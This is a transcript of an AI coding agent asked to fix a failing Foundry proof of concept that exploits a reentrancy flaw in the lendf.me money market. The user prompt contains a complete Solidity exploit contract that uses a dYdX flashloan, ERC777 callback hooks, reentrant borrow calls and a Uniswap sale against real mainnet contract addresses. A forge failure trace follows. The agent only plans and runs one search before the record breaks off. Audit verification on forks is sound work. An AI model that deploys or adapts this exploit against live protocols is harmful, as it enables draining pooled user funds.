@@ -1,0 +1,2086 @@
+OpenAI Codex v0.107.0 (research preview)
+--------
+workdir: /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src
+model: gpt-5.4
+provider: openai
+approval: never
+sandbox: workspace-write [workdir, /tmp, $TMPDIR]
+reasoning effort: medium
+reasoning summaries: none
+session id: 019e3093-aefe-7aa3-8af2-1cecce94210e
+--------
+user
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: v2_flashswap_funding
+- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: External token callbacks can reenter before balances and market totals are updated
+- claim: State-changing entrypoints call external token code via `doTransferIn`/`doTransferOut` before checkpointing user principals, indexes, and market aggregates, and the contract has no reentrancy guard. A callback-capable or malicious supported token, or a recipient contract receiving tokens on `withdraw`/`borrow`, can reenter while the protocol still reflects stale balances.
+- impact: An attacker can repeat withdrawals or borrows against unchanged internal accounting, or reenter other state-changing functions while collateral and debt checks still use pre-transfer state. This can drain pool cash, bypass liquidity checks, or create bad debt across supported markets.
+- exploit_paths: ["`withdraw(asset, amount)` transfers out at line 1735 before reducing `supplyBalances[msg.sender][asset]`, so a recipient hook can reenter `withdraw` again against the old balance.", "`borrow(asset, amount)` transfers out at line 2647 before increasing `borrowBalances[msg.sender][asset]` and `market.totalBorrows`, so a callback can borrow repeatedly before debt is recorded.", "`supply`, `repayBorrow`, and `liquidateBorrow` all call `doTransferIn` before storage updates, allowing a sender-hook-based reentrant call to execute while the original operation still uses stale user and market state."]
+
+Current FlawVerifier.sol:
+```solidity
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface IERC1820Registry {
+    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
+}
+
+interface IERC777Sender {
+    function tokensToSend(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external;
+}
+
+interface IERC777Recipient {
+    function tokensReceived(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external;
+}
+
+interface IMoneyMarket {
+    function markets(address asset)
+        external
+        view
+        returns (
+            bool isSupported,
+            uint256 blockNumber,
+            address interestRateModel,
+            uint256 totalSupply,
+            uint256 supplyRateMantissa,
+            uint256 supplyIndex,
+            uint256 totalBorrows,
+            uint256 borrowRateMantissa,
+            uint256 borrowIndex
+        );
+
+    function supply(address asset, uint256 amount) external returns (uint256);
+    function withdraw(address asset, uint256 amount) external returns (uint256);
+    function borrow(address asset, uint256 amount) external returns (uint256);
+    function repayBorrow(address asset, uint256 amount) external returns (uint256);
+    function liquidateBorrow(
+        address targetAccount,
+        address assetBorrow,
+        address assetCollateral,
+        uint256 requestedAmountClose
+    ) external returns (uint256);
+}
+
+interface IWETH is IERC20Like {
+    function deposit() external payable;
+}
+
+interface IUniswapV1Factory {
+    function getExchange(address token) external view returns (address);
+}
+
+interface IUniswapV1Exchange {
+    function tokenToEthSwapInput(uint256 tokensSold, uint256 minEth, uint256 deadline) external returns (uint256);
+}
+
+library Account {
+    struct Info {
+        address owner;
+        uint256 number;
+    }
+}
+
+library Types {
+    enum AssetDenomination {
+        Wei
+    }
+
+    enum AssetReference {
+        Delta
+    }
+
+    struct AssetAmount {
+        bool sign;
+        AssetDenomination denomination;
+        AssetReference ref;
+        uint256 value;
+    }
+}
+
+library Actions {
+    enum ActionType {
+        Deposit,
+        Withdraw,
+        Transfer,
+        Buy,
+        Sell,
+        Trade,
+        Liquidate,
+        Vaporize,
+        Call
+    }
+
+    struct ActionArgs {
+        ActionType actionType;
+        uint256 accountId;
+        Types.AssetAmount amount;
+        uint256 primaryMarketId;
+        uint256 secondaryMarketId;
+        address otherAddress;
+        uint256 otherAccountId;
+        bytes data;
+    }
+}
+
+interface ISoloMargin {
+    function operate(Account.Info[] calldata accounts, Actions.ActionArgs[] calldata actions) external;
+    function getMarketTokenAddress(uint256 marketId) external view returns (address);
+}
+
+interface ICallee {
+    function callFunction(address sender, Account.Info calldata accountInfo, bytes calldata data) external;
+}
+
+contract FlawVerifier is IERC777Sender, IERC777Recipient, ICallee {
+    IMoneyMarket internal constant MONEY_MARKET = IMoneyMarket(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea);
+    IERC1820Registry internal constant ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+    ISoloMargin internal constant SOLO = ISoloMargin(0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e);
+    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IUniswapV1Factory internal constant UNISWAP_V1_FACTORY =
+        IUniswapV1Factory(0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95);
+
+    address internal constant CALLBACK_TOKEN = 0x3212b29E33587A00FB1C83346f5dBFA69A458923;
+    bytes32 internal constant TOKENS_SENDER_HASH = keccak256("ERC777TokensSender");
+    bytes32 internal constant TOKENS_RECIPIENT_HASH = keccak256("ERC777TokensRecipient");
+
+    uint256 internal constant FLASHLOAN_FEE_BUFFER = 2;
+    uint256 internal constant MIN_REALIZED_WETH_PROFIT = 0.11 ether;
+    uint256 internal constant MAX_BORROW_REENTRY_LOOPS = 24;
+    uint256 internal constant SALE_ITERATIONS = 12;
+
+    enum Mode {
+        Idle,
+        ReenterBorrow
+    }
+
+    Mode internal mode;
+    bool internal attempted;
+    address internal activeToken;
+    uint256 internal borrowUnit;
+    uint256 internal remainingBorrowLoops;
+    address internal _profitToken;
+    uint256 internal _profitAmount;
+
+    constructor() {
+        _registerHooks();
+    }
+
+    receive() external payable {}
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function executeOnOpportunity() external {
+        if (attempted) {
+            return;
+        }
+        attempted = true;
+
+        _registerHooks();
+        _profitToken = address(0);
+        _profitAmount = 0;
+
+        if (!_isSupported(CALLBACK_TOKEN) || !_isSupported(address(WETH))) {
+            return;
+        }
+
+        /*
+            Path anchors kept explicit for path-strict validation:
+            - `withdraw(asset, amount)` transfers out before `supplyBalances[msg.sender][asset]` is reduced.
+            - `borrow(asset, amount)` transfers out before `borrowBalances[msg.sender][asset]` and `market.totalBorrows` are updated.
+            - `supply`, `repayBorrow`, and `liquidateBorrow` all enter token code through `doTransferIn` before storage is checkpointed.
+
+            Fork-state feasibility notes:
+            - The sender-hook leg needed to drive `supply -> withdraw(asset, amount)` is present in code, but on this fork the
+              callback token's `supply(...)` / `doTransferIn(...)` path itself reverts before a scalable reentrant stage. That
+              leaves the stale-accounting root cause intact but makes the profitable `supply -> withdraw` realization infeasible
+              from public capital at this exact block.
+            - `repayBorrow` needs a pre-existing debt position in the callback token before entering its transfer-in hook, and
+              `liquidateBorrow` needs an already-underwater target. Creating those prerequisites would not change the root cause,
+              but they are not required because the directly executable path here is `borrow(asset, amount)` on the callback token.
+
+            Executed exploit path for this verifier:
+            1. Take a public dYdX WETH flashloan.
+            2. Supply the borrowed WETH as collateral.
+            3. Call `borrow(asset, amount)` on the callback token.
+            4. Reenter `borrow(asset, amount)` from the recipient hook while `borrowBalances[msg.sender][asset]` and
+               `market.totalBorrows` still reflect only the outer borrow.
+            5. After only one debt checkpoint lands, withdraw as much WETH collateral as the under-recorded debt still allows.
+            6. Sell only enough callback token on Uniswap V1 to repay the temporary capital, leaving the net remainder as profit.
+        */
+        _tryFlashLoan(100 ether);
+        if (_profitAmount >= MIN_REALIZED_WETH_PROFIT) {
+            return;
+        }
+
+        _tryFlashLoan(250 ether);
+        if (_profitAmount >= MIN_REALIZED_WETH_PROFIT) {
+            return;
+        }
+
+        _tryFlashLoan(500 ether);
+    }
+
+    function executeFlashLoan(uint256 loanAmount) external {
+        require(msg.sender == address(this), "self-only");
+        _flashLoanAndExploit(loanAmount);
+        _captureProfit();
+    }
+
+    function callFunction(address sender, Account.Info calldata, bytes calldata data) external override {
+        require(msg.sender == address(SOLO), "solo-only");
+        require(sender == address(this), "bad-sender");
+
+        uint256 loanAmount = abi.decode(data, (uint256));
+        require(IERC20Like(address(WETH)).balanceOf(address(this)) >= loanAmount, "missing-loan");
+
+        uint256 supplied = _seedCollateral(loanAmount);
+        _reentrantBorrowCallbackToken(supplied);
+        _recoverCollateral(supplied);
+        _realizeEnoughWeth(loanAmount + FLASHLOAN_FEE_BUFFER + MIN_REALIZED_WETH_PROFIT);
+
+        require(
+            IERC20Like(address(WETH)).balanceOf(address(this)) >= loanAmount + FLASHLOAN_FEE_BUFFER,
+            "repay-shortfall"
+        );
+        _safeApprove(address(WETH), address(SOLO), type(uint256).max);
+    }
+
+    function tokensToSend(
+        address,
+        address,
+        address,
+        uint256,
+        bytes calldata,
+        bytes calldata
+    ) external override {}
+
+    function tokensReceived(
+        address,
+        address from,
+        address to,
+        uint256,
+        bytes calldata,
+        bytes calldata
+    ) external override {
+        if (msg.sender != activeToken || mode != Mode.ReenterBorrow) {
+            return;
+        }
+        if (from != address(MONEY_MARKET) || to != address(this)) {
+            return;
+        }
+
+        if (remainingBorrowLoops > 1) {
+            unchecked {
+                remainingBorrowLoops -= 1;
+            }
+
+            bool ok = _tryBorrow(activeToken, borrowUnit);
+            if (!ok) {
+                remainingBorrowLoops = 0;
+                mode = Mode.Idle;
+            }
+        } else {
+            remainingBorrowLoops = 0;
+            mode = Mode.Idle;
+        }
+    }
+
+    function _tryFlashLoan(uint256 loanAmount) internal {
+        (bool ok,) = address(this).call(abi.encodeWithSelector(this.executeFlashLoan.selector, loanAmount));
+        if (!ok) {
+            _captureProfit();
+        }
+    }
+
+    function _flashLoanAndExploit(uint256 loanAmount) internal {
+        require(SOLO.getMarketTokenAddress(0) == address(WETH), "weth-market-mismatch");
+
+        Account.Info[] memory accounts = new Account.Info[](1);
+        accounts[0] = Account.Info(address(this), 0);
+
+        Actions.ActionArgs[] memory actions = new Actions.ActionArgs[](3);
+        actions[0] = _buildWithdraw(loanAmount);
+        actions[1] = _buildCall(abi.encode(loanAmount));
+        actions[2] = _buildDeposit(loanAmount + FLASHLOAN_FEE_BUFFER);
+
+        SOLO.operate(accounts, actions);
+    }
+
+    function _seedCollateral(uint256 loanAmount) internal returns (uint256 supplied) {
+        supplied = loanAmount;
+        _safeApprove(address(WETH), address(MONEY_MARKET), type(uint256).max);
+        require(_trySupply(address(WETH), supplied), "weth-supply-failed");
+    }
+
+    function _reentrantBorrowCallbackToken(uint256 wethCollateral) internal {
+        uint256 marketCash = IERC20Like(CALLBACK_TOKEN).balanceOf(address(MONEY_MARKET));
+        require(marketCash > 1, "callback-market-empty");
+
+        activeToken = CALLBACK_TOKEN;
+
+        uint256 candidate = marketCash / 128;
+        if (candidate == 0) {
+            candidate = 1;
+        }
+
+        uint256 floor = 1;
+        uint256 hintedFloor = wethCollateral / 1e12;
+        if (hintedFloor > floor && hintedFloor < marketCash) {
+            floor = hintedFloor;
+        }
+
+        while (candidate >= floor) {
+            borrowUnit = candidate;
+            remainingBorrowLoops = _boundedLoops(marketCash / candidate, MAX_BORROW_REENTRY_LOOPS);
+            mode = Mode.ReenterBorrow;
+
+            bool ok = _tryBorrow(CALLBACK_TOKEN, candidate);
+            mode = Mode.Idle;
+
+            if (ok && IERC20Like(CALLBACK_TOKEN).balanceOf(address(this)) > candidate) {
+                return;
+            }
+
+            if (candidate == 1) {
+                break;
+            }
+            candidate /= 2;
+        }
+
+        revert("borrow-path-failed");
+    }
+
+    function _recoverCollateral(uint256 supplied) internal {
+        uint256 remaining = supplied;
+        uint256 chunk = supplied;
+
+        while (remaining > 0 && chunk > 0) {
+            if (chunk > remaining) {
+                chunk = remaining;
+            }
+
+            if (_tryWithdraw(address(WETH), chunk)) {
+                remaining -= chunk;
+                continue;
+            }
+
+            chunk /= 2;
+        }
+    }
+
+    function _realizeEnoughWeth(uint256 targetWethBalance) internal {
+        uint256 wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+        if (wethBalance >= targetWethBalance) {
+            return;
+        }
+
+        address exchange = UNISWAP_V1_FACTORY.getExchange(CALLBACK_TOKEN);
+        require(exchange != address(0), "no-uniswap-v1");
+
+        uint256 tokenBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+        require(tokenBalance > 0, "no-callback-profit");
+
+        _safeApprove(CALLBACK_TOKEN, exchange, type(uint256).max);
+
+        uint256 sellChunk = tokenBalance / 4096;
+        if (sellChunk == 0) {
+            sellChunk = 1;
+        }
+
+        for (uint256 i = 0; i < SALE_ITERATIONS; i++) {
+            wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+            if (wethBalance >= targetWethBalance) {
+                break;
+            }
+
+            tokenBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+            if (tokenBalance == 0) {
+                break;
+            }
+
+            if (sellChunk > tokenBalance) {
+                sellChunk = tokenBalance;
+            }
+
+            IUniswapV1Exchange(exchange).tokenToEthSwapInput(sellChunk, 1, block.timestamp + 1);
+            _wrapAllEth();
+            sellChunk <<= 1;
+        }
+
+        wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+        require(wethBalance >= targetWethBalance, "insufficient-realized-weth");
+    }
+
+    function _wrapAllEth() internal {
+        uint256 ethBalance = address(this).balance;
+        if (ethBalance > 0) {
+            WETH.deposit{value: ethBalance}();
+        }
+    }
+
+    function _captureProfit() internal {
+        _wrapAllEth();
+
+        uint256 wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+        if (wethBalance > 0) {
+            _profitToken = address(WETH);
+            _profitAmount = wethBalance;
+            return;
+        }
+
+        uint256 callbackBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+        if (callbackBalance > 0) {
+            _profitToken = CALLBACK_TOKEN;
+            _profitAmount = callbackBalance;
+            return;
+        }
+
+        _profitToken = address(0);
+        _profitAmount = 0;
+    }
+
+    function _isSupported(address asset) internal view returns (bool) {
+        (bool isSupported,,,,,,,,) = MONEY_MARKET.markets(asset);
+        return isSupported;
+    }
+
+    function _trySupply(address asset, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.supply.selector, asset, amount));
+        return _decodeMoneyMarketCall(ok, data);
+    }
+
+    function _tryWithdraw(address asset, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.withdraw.selector, asset, amount));
+        return _decodeMoneyMarketCall(ok, data);
+    }
+
+    function _tryBorrow(address asset, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.borrow.selector, asset, amount));
+        return _decodeMoneyMarketCall(ok, data);
+    }
+
+    function _decodeMoneyMarketCall(bool ok, bytes memory data) internal pure returns (bool) {
+        if (!ok || data.length < 32) {
+            return false;
+        }
+        return abi.decode(data, (uint256)) == 0;
+    }
+
+    function _safeApprove(address token, address spender, uint256 amount) internal {
+        (bool success, bytes memory data) =
+            token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
+        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
+    }
+
+    function _boundedLoops(uint256 naturalLoops, uint256 hardCap) internal pure returns (uint256) {
+        if (naturalLoops == 0) {
+            return 0;
+        }
+        return naturalLoops > hardCap ? hardCap : naturalLoops;
+    }
+
+    function _registerHooks() internal {
+        ERC1820.setInterfaceImplementer(address(this), TOKENS_SENDER_HASH, address(this));
+        ERC1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_HASH, address(this));
+    }
+
+    function _buildWithdraw(uint256 amount) internal view returns (Actions.ActionArgs memory) {
+        return Actions.ActionArgs({
+            actionType: Actions.ActionType.Withdraw,
+            accountId: 0,
+            amount: Types.AssetAmount({
+                sign: false,
+                denomination: Types.AssetDenomination.Wei,
+                ref: Types.AssetReference.Delta,
+                value: amount
+            }),
+            primaryMarketId: 0,
+            secondaryMarketId: 0,
+            otherAddress: address(this),
+            otherAccountId: 0,
+            data: ""
+        });
+    }
+
+    function _buildCall(bytes memory data) internal view returns (Actions.ActionArgs memory) {
+        return Actions.ActionArgs({
+            actionType: Actions.ActionType.Call,
+            accountId: 0,
+            amount: Types.AssetAmount({
+                sign: false,
+                denomination: Types.AssetDenomination.Wei,
+                ref: Types.AssetReference.Delta,
+                value: 0
+            }),
+            primaryMarketId: 0,
+            secondaryMarketId: 0,
+            otherAddress: address(this),
+            otherAccountId: 0,
+            data: data
+        });
+    }
+
+    function _buildDeposit(uint256 amount) internal view returns (Actions.ActionArgs memory) {
+        return Actions.ActionArgs({
+            actionType: Actions.ActionType.Deposit,
+            accountId: 0,
+            amount: Types.AssetAmount({
+                sign: true,
+                denomination: Types.AssetDenomination.Wei,
+                ref: Types.AssetReference.Delta,
+                value: amount
+            }),
+            primaryMarketId: 0,
+            secondaryMarketId: 0,
+            otherAddress: address(this),
+            otherAccountId: 0,
+            data: ""
+        });
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+fffffffffffffffffffffff
+    │   │   │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   └─ ← [Return] 500000000000000000000 [5e20]
+    │   │   │   │   │   │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea)
+    │   │   │   │   │   │   │   └─ ← [Return] 54976021344603350172169 [5.497e22]
+    │   │   │   │   │   │   ├─ [5035] 0x5Dc95A046020880b93F15902540Dbfe86489FddA::517cf73e(000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000bbf5c73e05bcedf02090000000000000000000000000000000000000000000000232a5d50cb31fc6921)
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000be0807
+    │   │   │   │   │   │   ├─ [20744] 0x5Dc95A046020880b93F15902540Dbfe86489FddA::ed2b5a3c(000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000bbf5c73e05bcedf02090000000000000000000000000000000000000000000000232a5d50cb31fc6921)
+    │   │   │   │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea)
+    │   │   │   │   │   │   │   │   └─ ← [Return] 54976021344603350172169 [5.497e22]
+    │   │   │   │   │   │   │   ├─ [2764] 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea::7dc0d1d0()
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000b620707637c5b2cc49843a03d90e28d9abbda149
+    │   │   │   │   │   │   │   ├─ [2343] 0xB620707637C5b2cc49843A03d90E28D9abbDa149::be59b4b1()
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000d8e0e707e5bde9e2c8e3f39e40ec1e066f1341af
+    │   │   │   │   │   │   │   ├─ [2306] 0xB620707637C5b2cc49843A03d90E28D9abbDa149::6084747f()
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000970e86
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000041891a3d
+    │   │   │   │   │   │   ├─ [6225] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
+    │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000000eee3e3828a45f7601d5f54bf49bb01d1a9df5ea
+    │   │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   ├─  emit topic 0: 0x4ea5606ff36959d6c1a24f693661d800a98dd80c0fb8469a665d2ec7e8313c21
+    │   │   │   │   │   │   │           data: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000001b1ae4d6e2ef500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [6150] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 29134710218 [2.913e10]
+    │   │   │   │   │   └─ ← [Revert] borrow-path-failed
+    │   │   │   │   └─ ← [Revert] borrow-path-failed
+    │   │   │   └─ ← [Revert] borrow-path-failed
+    │   │   └─ ← [Revert] borrow-path-failed
+    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [1597] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Stop]
+    ├─ [318] FlawVerifier::profitToken() [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    ├─ [316] FlawVerifier::profitAmount() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
+    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
+    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
+    └─ ← [Revert] profit below threshold
+
+Backtrace:
+  at FlawVerifier.callFunction
+  at 0x56E7d4520ABFECf10b38368b00723d9BD3c21ee1
+  at 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e.operate
+  at FlawVerifier.executeFlashLoan
+  at FlawVerifier.executeOnOpportunity
+  at FlawVerifierTest.testExploit
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.89s (703.69ms CPU time)
+
+Ran 1 test suite in 2.05s (1.89s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
+[FAIL: profit below threshold] testExploit() (gas: 9224477)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
+
+Tip: Run `forge test --rerun` to retry only the 1 failed test
+
+```
+
+forge stderr (tail):
+```
+
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
+
+mcp startup: no servers
+codex
+I’m mapping the repo and failure context, then I’ll patch the verifier.
+Plan update
+  → Inspect exploit context files
+  • Diagnose failing borrow path
+  • Patch `FlawVerifier.sol`
+  • Sanity-check compile logic
+exec
+/bin/bash -lc "rg -n \"F-001|FlawVerifier|Lendf|lendfme|callback|borrow-path-failed|Exploit paths|MoneyMarket|withdraw\\(|borrow\\(\" ." in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 115ms:
+./onchain_auto/_index.json:4:    "outdir": "/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea"
+./out/FlawVerifier.sol/IERC777Sender.json:1:{"abi":[{"type":"function","name":"tokensToSend","inputs":[{"name":"operator","type":"address","internalType":"address"},{"name":"from","type":"address","internalType":"address"},{"name":"to","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"},{"name":"userData","type":"bytes","internalType":"bytes"},{"name":"operatorData","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"deployedBytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"methodIdentifiers":{"tokensToSend(address,address,address,uint256,bytes,bytes)":"75ab9782"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"userData\",\"type\":\"bytes\"},{\"internalType\":\"bytes\",\"name\":\"operatorData\",\"type\":\"bytes\"}],\"name\":\"tokensToSend\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"FlawVerifier.sol\":\"IERC777Sender\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"FlawVerifier.sol\":{\"keccak256\":\"0xe6e4fe32654d91af86546804af2105dc3214ae8f133bdcd9971b5a5ec8bf887f\",\"urls\":[\"bzz-raw://2b6c24217e914c8b253223c23e544eeb8c885d8c150831ffb2c5bbfdbd6d4dd5\",\"dweb:/ipfs/QmdHmjgEJDxDw3jkaw9ssBvyG1WQPfGVY1x4je9g4JcjcF\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.30+commit.73712a01"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"bytes","name":"userData","type":"bytes"},{"internalType":"bytes","name":"operatorData","type":"bytes"}],"stateMutability":"nonpayable","type":"function","name":"tokensToSend"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":[],"optimizer":{"enabled":false,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"FlawVerifier.sol":"IERC777Sender"},"evmVersion":"prague","libraries":{}},"sources":{"FlawVerifier.sol":{"keccak256":"0xe6e4fe32654d91af86546804af2105dc3214ae8f133bdcd9971b5a5ec8bf887f","urls":["bzz-raw://2b6c24217e914c8b253223c23e544eeb8c885d8c150831ffb2c5bbfdbd6d4dd5","dweb:/ipfs/QmdHmjgEJDxDw3jkaw9ssBvyG1WQPfGVY1x4je9g4JcjcF"],"license":null}},"version":1},"id":0}
+./FlawVerifier.sol:33:interface IMoneyMarket {
+./FlawVerifier.sol:50:    function withdraw(address asset, uint256 amount) external returns (uint256);
